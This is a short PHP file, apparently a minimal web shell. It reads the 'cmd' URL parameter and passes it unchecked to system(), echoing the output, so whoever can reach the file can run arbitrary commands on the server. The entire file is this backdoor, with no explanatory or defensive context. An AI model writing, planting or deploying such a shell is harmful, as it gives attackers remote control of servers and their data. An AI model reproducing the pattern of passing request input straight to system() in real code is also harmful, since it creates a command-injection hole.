<?php
function execute($com)
{
    echo system($com);
}

$cmd = $_GET['cmd'];
execute($cmd);
?>